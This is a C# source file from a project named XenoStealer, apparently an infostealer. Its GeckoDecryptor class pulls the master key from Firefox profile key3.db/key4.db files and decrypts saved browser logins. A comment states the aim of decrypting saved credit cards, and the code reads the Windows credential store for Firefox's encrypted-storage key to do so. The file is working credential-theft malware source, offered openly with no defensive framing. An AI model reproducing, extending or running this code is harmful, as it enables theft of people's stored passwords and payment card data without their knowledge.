using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;
using static XenoStealer.ASN1DER;
using System.Text.RegularExpressions;
using static XenoStealer.InternalStructs;

namespace XenoStealer
{
    public class GeckoDecryptor
    {
        private static Dictionary<string, byte[]> osKeyStore = new Dictionary<string, byte[]>();



        public bool operational = false;
        private byte[] masterKey = null;

        public GeckoDecryptor(string profilePath) 
        {
            string key3Path = Path.Combine(profilePath, "key3.db");
            string key4Path = Path.Combine(profilePath, "key4.db");
            if (File.Exists(key3Path))
            {
                masterKey = GetMasterKeyFromKey3(key3Path);
            }
            else if (File.Exists(key4Path))
            {
                masterKey = GetMasterKeyFromKey4(key4Path);
            }
            else
            {
                return;
            }
            operational = masterKey != null;
        }

        public string Decrypt(byte[] EncryptedData) 
        {
            if (!operational) 
            {
                throw new Exception("this interface is non-operational!");
            }

            ASN1DERObject asn = ASN1DER.Parse(EncryptedData);

            byte[] IV = asn.objects?[0].objects?[1].objects?[1].data;
            byte[] cipherData = asn.objects?[0].objects?[2].data;

            if (IV == null || cipherData == null)
            {
                return null;
            }

            string decryptedData = TripleDES.DecryptStringDesCbc(masterKey, IV, cipherData);

            if (decryptedData == null)
            {
                return null;
            }

            return Regex.Replace(decryptedData, "[^\u0020-\u007F]", "");
        }


        public string DecryptBase64(string cypherText)
        {
            if (cypherText == null)
            {
                return null;
            }

            byte[] b64Decode;
            try
            {
                b64Decode = Convert.FromBase64String(cypherText);
            }
            catch
            {
                return null;
            }

            return Decrypt(b64Decode);
        }

        public static string Decrypt(string profilePath, byte[] EncryptedData) 
        {
            string key3Path = Path.Combine(profilePath, "key3.db");
            string key4Path = Path.Combine(profilePath, "key4.db");
            byte[] masterKey;
            if (File.Exists(key3Path))
            {
                masterKey = GetMasterKeyFromKey3(key3Path);
            }
            else if (File.Exists(key4Path))
            {
                masterKey = GetMasterKeyFromKey4(key4Path);
            }
            else 
            {
                return null;
            }

            if (masterKey == null) 
            {
                return null;
            }

            ASN1DERObject asn = ASN1DER.Parse(EncryptedData);

            byte[] IV = asn.objects?[0].objects?[1].objects?[1].data;
            byte[] cipherData = asn.objects?[0].objects?[2].data;

            if (IV == null || cipherData == null) 
            {
                return null;
            }

            string decryptedData = TripleDES.DecryptStringDesCbc(masterKey, IV, cipherData);

            if (decryptedData == null) 
            {
                return null;
            }

            return Regex.Replace(decryptedData, "[^\u0020-\u007F]", "");

        }

        public static string DecryptBase64(string profilePath, string cypherText)
        {
            if (cypherText == null)
            {
                return null;
            }

            byte[] b64Decode;
            try
            {
                b64Decode = Convert.FromBase64String(cypherText);
            }
            catch
            {
                return null;
            }

            return Decrypt(profilePath, b64Decode);
        }

        private static bool ASNContainsBytes(ASN1DER.ASN1DERObject data, byte[] BytesToMatch)
        {
            if (data.data == null)
            {
                foreach (ASN1DER.ASN1DERObject obj in data.objects)
                {
                    if (ASNContainsBytes(obj, BytesToMatch))
                    {
                        return true;
                    }
                }
                return false;
            }

            return Utils.CompareByteArrays(data.data, BytesToMatch);
        }

        private static byte[] GetMasterKeyFromKey4(string path)
        {

            byte[] fileBytes = Utils.ForceReadFile(path);

            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("metaData"))
            {
                return null;
            }

            bool PasswordCompareWorked = false;
            byte[] globalSalt = null;
            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                string id = parser.GetValue<string>(i, "id");
                if (id == null)
                {
                    continue;
                }

                globalSalt = parser.GetValue<byte[]>(i, "item1");
                byte[] ASN1DERBytes = parser.GetValue<byte[]>(i, "item2");

                if (globalSalt == null || ASN1DERBytes == null)
                {
                    continue;
                }

                ASN1DER.ASN1DERObject parsedData = ASN1DER.Parse(ASN1DERBytes);

                byte[] v1 = new byte[] { 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x0C, 0x05, 0x01, 0x03 };
                byte[] v2 = new byte[] { 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0D };

                if (ASNContainsBytes(parsedData, v1))
                {
                    byte[] entrySalt = parsedData.objects?[0].objects?[0].objects?[1].objects?[0].data;
                    byte[] cipherText = parsedData.objects?[0].objects?[1].data;
                    if (entrySalt == null || cipherText == null) continue;

                    byte[] passBytes = TripleDES.DecryptByteDesCbc(globalSalt, null, entrySalt, cipherText);
                    if (passBytes == null) continue;

                    string stringToCheckAgaist = "password-check";

                    string passwordCheck = Encoding.GetEncoding("ISO-8859-1").GetString(passBytes, 0, stringToCheckAgaist.Length);
                    if (passwordCheck != stringToCheckAgaist) continue;

                    PasswordCompareWorked = true;
                    break;

                }
                else if (ASNContainsBytes(parsedData, v2))
                {
                    byte[] entrySalt = parsedData.objects?[0].objects?[0].objects?[1].objects?[0].objects?[1].objects?[0].data;
                    byte[] partVector = parsedData.objects?[0].objects?[0].objects?[1].objects?[2].objects?[1].data;
                    byte[] cipherText = parsedData.objects?[0].objects?[0].objects?[1].objects?[3].data;

                    if (entrySalt == null || partVector == null || cipherText == null) continue;

                    byte[] passBytes = PasswordBasedDecryption.Decrypt(cipherText, globalSalt, null, entrySalt, partVector);
                    if (passBytes == null) continue;

                    string stringToCheckAgaist = "password-check";

                    string passwordCheck = Encoding.GetEncoding("ISO-8859-1").GetString(passBytes, 0, stringToCheckAgaist.Length);
                    if (passwordCheck != stringToCheckAgaist) continue;

                    PasswordCompareWorked = true;
                    break;

                }
                else
                {
                    continue;
                }
            }

            if (!PasswordCompareWorked)
            {
                return null;//cant know if we have a working version.
            }

            if (!parser.ReadTable("nssPrivate"))
            {
                return null;
            }

            for (var i = 0; i < parser.GetRowCount(); i++)
            {
                byte[] a11Bytes = parser.GetValue<byte[]>(i, "a11");

                if (a11Bytes == null)
                {
                    continue;
                }

                ASN1DERObject parsedA11 = ASN1DER.Parse(a11Bytes);

                byte[] keyEntrySalt = parsedA11.objects?[0].objects?[0].objects?[1].objects?[0].objects?[1].objects?[0].data;
                byte[] keyPartVector = parsedA11.objects?[0].objects?[0].objects?[1].objects?[2].objects?[1].data;
                byte[] keyCipherText = parsedA11.objects?[0].objects?[0].objects?[1].objects?[3].data;

                if (keyEntrySalt == null || keyPartVector == null || keyCipherText == null)
                {
                    continue;
                }

                byte[] fullPrivateKey = PasswordBasedDecryption.Decrypt(keyCipherText, globalSalt, null, keyEntrySalt, keyPartVector);
                if (fullPrivateKey == null)
                {
                    continue;
                }

                byte[] privateKey = new byte[24];

                if (privateKey.Length > fullPrivateKey.Length)
                {
                    continue;
                }

                Array.Copy(fullPrivateKey, privateKey, privateKey.Length);

                return privateKey;

            }

            return null;
        }

        private static T GetFirstItemFromKeyValuePairList<T>(KeyValuePair<string, T>[] keyValuePairs, string key)
        {
            foreach (KeyValuePair<string, T> keyValue in keyValuePairs)
            {
                if (keyValue.Key == key)
                {
                    return keyValue.Value;
                }
            }
            return default;
        }

        private static bool KeyValuePairListContainsKey<T>(KeyValuePair<string, T>[] keyValuePairs, string key)
        {
            foreach (KeyValuePair<string, T> keyValue in keyValuePairs)
            {
                if (keyValue.Key == key)
                {
                    return true;
                }
            }
            return false;
        }

        private static byte[] GetMasterKeyFromKey3(string path)
        {
            byte[] fileBytes = Utils.ForceReadFile(path);

            if (fileBytes == null)
            {
                return null;
            }

            KeyValuePair<string, byte[]>[] parsedData = BerkelyParser.Parse(fileBytes);

            if (!KeyValuePairListContainsKey(parsedData, "password-check") || !KeyValuePairListContainsKey(parsedData, "global-salt"))
            {
                return null;
            }

            byte[] passCheckData = GetFirstItemFromKeyValuePairList(parsedData, "password-check");
            byte[] globalSalt = GetFirstItemFromKeyValuePairList(parsedData, "global-salt");

            int entrySaltLength = passCheckData[1];
            byte[] entrySalt = new byte[entrySaltLength];
            Array.Copy(passCheckData, 3, entrySalt, 0, entrySaltLength);

            int oldLength = passCheckData.Length - (3 + entrySaltLength + 18);

            int offsetLength = (3 + entrySaltLength + 2 + oldLength);

            byte[] passCheck = new byte[passCheckData.Length - offsetLength];
            Array.Copy(passCheckData, offsetLength, passCheck, 0, passCheck.Length);


            byte[] passBytes = TripleDES.DecryptByteDesCbc(globalSalt, null, entrySalt, passCheck);
            if (passBytes == null)
            {
                return null;
            }
            string stringToCheckAgaist = "password-check";

            string passwordCheck = Encoding.GetEncoding("ISO-8859-1").GetString(passBytes, 0, stringToCheckAgaist.Length);
            if (passwordCheck != stringToCheckAgaist)
            {
                return null;// the password check failed.
            }
            
            byte[] asnData = null;
            foreach (KeyValuePair<string, byte[]> i in parsedData)
            {
                if (i.Key.ToLower() != "password-check" && i.Key.ToLower() != "global-salt" && i.Key.ToLower() != "version")//the private key data is stored in the 4th key, which has a weird name, so we get it like this.
                {
                    asnData=i.Value;
                    break;
                }
            }

            if (asnData == null)
            {
                return null;
            }

            ASN1DERObject asn = ASN1DER.Parse(asnData);

            entrySalt = asn.objects?[0].objects?[0].objects?[1].objects?[0].data;
            byte[] input = asn.objects?[0].objects?[1].data;

            if (input == null || entrySalt == null)
            {
                return null;
            }
            asnData = TripleDES.DecryptByteDesCbc(globalSalt, null, entrySalt, input);

            if (asnData == null)
            {
                return null;
            }

            asn = ASN1DER.Parse(asnData);

            asnData = asn.objects?[0].objects?[2].data;
            if (asnData == null)
            {
                return null;
            }

            asn = ASN1DER.Parse(asnData);

            byte[] privateKey = new byte[24];

            byte[] privateKeyData = asn.objects?[0].objects?[3].data;

            if (privateKeyData == null)
            {
                return null;
            }

            if (privateKeyData.Length > privateKey.Length)
            {
                Array.Copy(privateKeyData, privateKeyData.Length - privateKey.Length, privateKey, 0, privateKey.Length);
            }
            else
            {
                privateKey = privateKeyData;
            }

            return privateKey;

        }


        //goal: make OSkeyStore decryptor so i can decrypt credit cards
        //cc data is stored in autofill-profiles.json
        //https://searchfox.org/mozilla-central/source/mozglue/misc/PreXULSkeletonUI.cpp line 340, proves we can extract the MOZ_APP_BASENAME from the path.
        //https://github.com/mozilla/gecko-dev/blob/8ff5dcf8778644a7226a00f580968f85ed7bd997/security/manager/ssl/NSSKeyStore.cpp#L133
        //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/OSKeyStore.cpp#L601 and ^ shows us how to decrypt these values.
        //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/CredentialManagerSecret.cpp#L92 shows us how to get the decryption key. (windows only)
        //https://github.com/mozilla/gecko-dev/blob/master/toolkit/modules/OSKeyStore.sys.mjs#L43 proves how the label is created (name to get key?) (MOZ_APP_BASENAME + " Encrypted Storage")

        private static byte[] GetOsKeyStoreKey(string MOZAPPBASENAME) 
        {
            string aLabel = MOZAPPBASENAME + " Encrypted Storage";
            //https://github.com/mozilla/gecko-dev/blob/master/toolkit/modules/OSKeyStore.sys.mjs#L43 proves how the label is created (name to get key?) (MOZ_APP_BASENAME + " Encrypted Storage")
            if (!NativeMethods.CredReadW(aLabel, CRED_TYPE.GENERIC, 0, out IntPtr credentialPtr))
            {
                return null;
            }
            //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/CredentialManagerSecret.cpp#L92 shows us how to get the decryption key. (windows only)
            InternalStructs.CREDENTIALW credData = Marshal.PtrToStructure<InternalStructs.CREDENTIALW>(credentialPtr);
            byte[] credBuffer = new byte[credData.credentialBlobSize];
            Marshal.Copy(credData.credentialBlob, credBuffer, 0, credBuffer.Length);
            NativeMethods.CredFree(credentialPtr);
            return credBuffer;
        }

        public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, byte[] EncryptedData) 
        {
            byte[] key;
            if (osKeyStore.ContainsKey(MOZAPPBASENAME))
            {
                key = osKeyStore[MOZAPPBASENAME];
            }
            else 
            {
                key = GetOsKeyStoreKey(MOZAPPBASENAME);
                osKeyStore[MOZAPPBASENAME] = key;
            }
             
            if (key == null) 
            {
                osKeyStore.Remove(MOZAPPBASENAME);
                return null;
            }

            //https://github.com/mozilla/gecko-dev/blob/8ff5dcf8778644a7226a00f580968f85ed7bd997/security/manager/ssl/NSSKeyStore.cpp#L133
            //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/OSKeyStore.cpp#L601 and ^ shows us how to decrypt these values.

            byte[] iv = new byte[12];
            Array.Copy(EncryptedData, 0, iv, 0, 12);

            // Determine the lengths of buffer and tag
            int bufferLength = EncryptedData.Length - 12;
            byte[] Buffer = new byte[bufferLength];
            Array.Copy(EncryptedData, 12, Buffer, 0, bufferLength);

            // Extract the tag and data from Buffer
            int tagLength = 16;
            byte[] tag = new byte[tagLength];
            byte[] data = new byte[bufferLength - tagLength];
            Array.Copy(Buffer, bufferLength - tagLength, tag, 0, tagLength);
            Array.Copy(Buffer, 0, data, 0, bufferLength - tagLength);

            return AesGcm.Decrypt(key, iv, null, data, tag);

        }

        public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, string cypherText)
        {
            try
            { 
                return OsKeyStoreDecrypt(MOZAPPBASENAME, Convert.FromBase64String(cypherText));
                
            }
            catch { }
            return null;
        }

        public static string GetMOZAPPBASENAMEFromProfilePath(string profilePath)
        {
            //https://searchfox.org/mozilla-central/source/mozglue/misc/PreXULSkeletonUI.cpp line 340, proves we can extract the MOZ_APP_BASENAME from the profile path.
            string root = Directory.GetDirectoryRoot(profilePath);

            while (true)
            {
                if (!File.Exists(Path.Combine(profilePath, "profiles.ini")))
                {
                    if (string.Equals(profilePath, root, StringComparison.OrdinalIgnoreCase))
                    {
                        return null;
                    }
                    profilePath = Path.Combine(profilePath, "..");
                    profilePath = Path.GetFullPath(profilePath);

                    continue;
                }

                return new DirectoryInfo(profilePath).Name;
            }
        }


    }
}
